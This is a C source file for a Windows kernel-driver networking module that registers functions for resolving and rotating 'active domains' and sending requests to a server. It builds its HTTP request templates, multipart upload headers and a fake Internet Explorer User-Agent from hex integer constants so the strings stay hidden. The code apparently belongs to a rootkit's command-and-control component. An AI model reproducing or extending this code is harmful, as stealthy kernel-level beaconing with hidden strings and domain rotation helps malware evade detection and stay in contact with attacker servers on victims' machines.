#include <ntifs.h>
#include <wdm.h>
#include <ntstrsafe.h>

#include "../../mod_shared/headers.h"

#define CONST_WORD_NULL &pGlobalBlock->pNetcommBlock->constWords[0]

#include "mod_netcomm.c"
#include "mod_netcommApi.c"

NTSTATUS mod_netcommEntry(uintptr_t modBase, pglobal_block_t pGlobalBlock)
{
    pmod_common_block_t pCommonBlock = pGlobalBlock->pCommonBlock;
    pmod_netcomm_block_t pNetcommBlock;
    pmod_header_t pModHeader = (pmod_header_t)modBase;

    pCommonBlock->fncommon_allocate_memory(pCommonBlock, &pNetcommBlock, sizeof(mod_netcomm_block_t), NonPagedPool);
    pGlobalBlock->pNetcommBlock = pNetcommBlock;
    pNetcommBlock->pModBase = (uint8_t*)modBase;

#ifndef _SOLID_DRIVER
    
#ifdef _WIN64
    pCommonBlock->fncommon_fix_addr_value((PUINT8)getGlobalDataPtr, 11, GLOBAL_DATA_PATTERN, pGlobalBlock);
#else
    pCommonBlock->fncommon_fix_addr_value((PUINT8)modBase + sizeof(mod_header_t), pModHeader->sizeOfModReal, GLOBAL_DATA_PATTERN, pGlobalBlock);
#endif // _WIN64

#endif // _SOLID_DRIVER

    DECLARE_GLOBAL_FUNC(pNetcommBlock, netcomm_free_previous_resources);
    DECLARE_GLOBAL_FUNC(pNetcommBlock, netcomm_parse_uri);
    DECLARE_GLOBAL_FUNC(pNetcommBlock, netcomm_generate_boundary_separator_for_nrt);
    DECLARE_GLOBAL_FUNC(pNetcommBlock, netcomm_generate_random_name);
    DECLARE_GLOBAL_FUNC(pNetcommBlock, netcomm_prepare_request);
    DECLARE_GLOBAL_FUNC(pNetcommBlock, netcomm_valide_response);
    DECLARE_GLOBAL_FUNC(pNetcommBlock, netcomm_make_server_transaction);
    DECLARE_GLOBAL_FUNC(pNetcommBlock, netcomm_parse_http_header);

    // Интерфейсные функции
    DECLARE_GLOBAL_FUNC(pNetcommBlock, netcomm_select_active_element);
    DECLARE_GLOBAL_FUNC(pNetcommBlock, netcomm_resolve_active_domain);
    DECLARE_GLOBAL_FUNC(pNetcommBlock, netcomm_rotate);
    DECLARE_GLOBAL_FUNC(pNetcommBlock, netcomm_shutdown_routine);
    DECLARE_GLOBAL_FUNC(pNetcommBlock, netcomm_send_request_to_server);

    {
        PUCHAR ptr;

        ptr = (uint8_t*)pNetcommBlock->postQuery;
        *(((PUINT32)ptr)++) = 0x54534f50;
        *(((PUINT32)ptr)++) = 0x20732520;
        *(((PUINT32)ptr)++) = 0x50545448;
        *(((PUINT32)ptr)++) = 0x302e312f;
        *(PUINT32)ptr = 0x00000a0d;

        ptr = (uint8_t*)pNetcommBlock->getQuery; // "GET %s HTTP/1.0\r\nHost: %s\r\nAccept: */*\r\n%s\r\n\r\n"
        *(((PUINT32)ptr)++) = 0x20544547;
        *(((PUINT32)ptr)++) = 0x48207325;
        *(((PUINT32)ptr)++) = 0x2f505454;
        *(((PUINT32)ptr)++) = 0x0d302e31;
        *(((PUINT32)ptr)++) = 0x736f480a;
        *(((PUINT32)ptr)++) = 0x25203a74;
        *(((PUINT32)ptr)++) = 0x410a0d73;
        *(((PUINT32)ptr)++) = 0x70656363;
        *(((PUINT32)ptr)++) = 0x2a203a74;
        *(((PUINT32)ptr)++) = 0x0a0d2a2f;
        *(((PUINT32)ptr)++) = 0x0a0d7325;
        *(PUINT16)ptr = 0x0000;

        ptr = (uint8_t*)pNetcommBlock->hdrHost;
        *(((PUINT32)ptr)++) = 0x74736f48;
        *(((PUINT32)ptr)++) = 0x7325203a;
        *(PUINT32)ptr = 0x00000a0d;

        ptr = (uint8_t*)pNetcommBlock->hdrContentType;
        *(((PUINT32)ptr)++) = 0x746e6f43;
        *(((PUINT32)ptr)++) = 0x2d746e65;
        *(((PUINT32)ptr)++) = 0x65707954;
        *(((PUINT32)ptr)++) = 0x756d203a;
        *(((PUINT32)ptr)++) = 0x7069746c;
        *(((PUINT32)ptr)++) = 0x2f747261;
        *(((PUINT32)ptr)++) = 0x6d726f66;
        *(((PUINT32)ptr)++) = 0x7461642d;
        *(((PUINT32)ptr)++) = 0x62203b61;
        *(((PUINT32)ptr)++) = 0x646e756f;
        *(((PUINT32)ptr)++) = 0x3d797261;
        *(((PUINT32)ptr)++) = 0x0a0d7325;
        *ptr = 0x00;

        ptr = (uint8_t*)pNetcommBlock->hdrContentLength;
        *(((PUINT32)ptr)++) = 0x746e6f43;
        *(((PUINT32)ptr)++) = 0x2d746e65;
        *(((PUINT32)ptr)++) = 0x676e654c;
        *(((PUINT32)ptr)++) = 0x203a6874;
        *(((PUINT32)ptr)++) = 0x0a0d6425;
        *ptr = 0x00;

        ptr = (uint8_t*)pNetcommBlock->hdrUserAgent;
        *(((PUINT32)ptr)++) = 0x72657355;
        *(((PUINT32)ptr)++) = 0x6567412d;
        *(((PUINT32)ptr)++) = 0x203a746e;
        *(((PUINT32)ptr)++) = 0x697a6f4d;
        *(((PUINT32)ptr)++) = 0x2f616c6c;
        *(((PUINT32)ptr)++) = 0x20302e35;
        *(((PUINT32)ptr)++) = 0x6d6f6328;
        *(((PUINT32)ptr)++) = 0x69746170;
        *(((PUINT32)ptr)++) = 0x3b656c62;
        *(((PUINT32)ptr)++) = 0x49534d20;
        *(((PUINT32)ptr)++) = 0x2e392045;
        *(((PUINT32)ptr)++) = 0x57203b30;
        *(((PUINT32)ptr)++) = 0x6f646e69;
        *(((PUINT32)ptr)++) = 0x4e207377;
        *(((PUINT32)ptr)++) = 0x64252054;
        *(((PUINT32)ptr)++) = 0x3b64252e;
        *(((PUINT32)ptr)++) = 0x54207325;
        *(((PUINT32)ptr)++) = 0x65646972;
        *(((PUINT32)ptr)++) = 0x352f746e;
        *(((PUINT32)ptr)++) = 0x0d29302e;
        *(PUINT16)ptr = 0x000a;

        ptr = (uint8_t*)pNetcommBlock->hdrUserAgentx64;
        *(((PUINT32)ptr)++) = 0x6e695720;
        *(((PUINT32)ptr)++) = 0x203b3436;
        *(((PUINT32)ptr)++) = 0x3b343678;
        *ptr = 0x00;

        ptr = (uint8_t*)pNetcommBlock->contentDispBlock;
        *(((PUINT32)ptr)++) = 0x73252d2d;
        *(((PUINT32)ptr)++) = 0x6f430a0d;
        *(((PUINT32)ptr)++) = 0x6e65746e;
        *(((PUINT32)ptr)++) = 0x69442d74;
        *(((PUINT32)ptr)++) = 0x736f7073;
        *(((PUINT32)ptr)++) = 0x6f697469;
        *(((PUINT32)ptr)++) = 0x66203a6e;
        *(((PUINT32)ptr)++) = 0x2d6d726f;
        *(((PUINT32)ptr)++) = 0x61746164;
        *(((PUINT32)ptr)++) = 0x616e203b;
        *(((PUINT32)ptr)++) = 0x223d656d;
        *(((PUINT32)ptr)++) = 0x25227325;
        *(((PUINT32)ptr)++) = 0x0d0a0d73;
        *(((PUINT32)ptr)++) = 0x0d73250a;
        *(PUINT16)ptr = 0x000a;

        ptr = (uint8_t*)pNetcommBlock->blockTypeFields;
        *(((PUINT32)ptr)++) = 0x6966203b;
        *(((PUINT32)ptr)++) = 0x616e656c;
        *(((PUINT32)ptr)++) = 0x223d656d;
        *(((PUINT32)ptr)++) = 0x0d227325;
        *(((PUINT32)ptr)++) = 0x6e6f430a;
        *(((PUINT32)ptr)++) = 0x746e6574;
        *(((PUINT32)ptr)++) = 0x7079542d;
        *(((PUINT32)ptr)++) = 0x61203a65;
        *(((PUINT32)ptr)++) = 0x696c7070;
        *(((PUINT32)ptr)++) = 0x69746163;
        *(((PUINT32)ptr)++) = 0x6f2f6e6f;
        *(((PUINT32)ptr)++) = 0x74657463;
        *(((PUINT32)ptr)++) = 0x7274732d;
        *(((PUINT32)ptr)++) = 0x0d6d6165;
        *(((PUINT32)ptr)++) = 0x6e6f430a;
        *(((PUINT32)ptr)++) = 0x746e6574;
        *(((PUINT32)ptr)++) = 0x6172542d;
        *(((PUINT32)ptr)++) = 0x6566736e;
        *(((PUINT32)ptr)++) = 0x6e452d72;
        *(((PUINT32)ptr)++) = 0x69646f63;
        *(((PUINT32)ptr)++) = 0x203a676e;
        *(PUINT32)ptr = 0x00007325;

        ptr = (uint8_t*)pNetcommBlock->encTypes;
        *(((PUINT32)ptr)++) = 0x616e6962;
        *(((PUINT32)ptr)++) = 0x62007972; // 0x20 -> 0x00
        *(((PUINT32)ptr)++) = 0x36657361;
        *(PUINT16)ptr = 0x0034;

        pNetcommBlock->constWords[0] = 0;
    }

    return STATUS_SUCCESS;
}
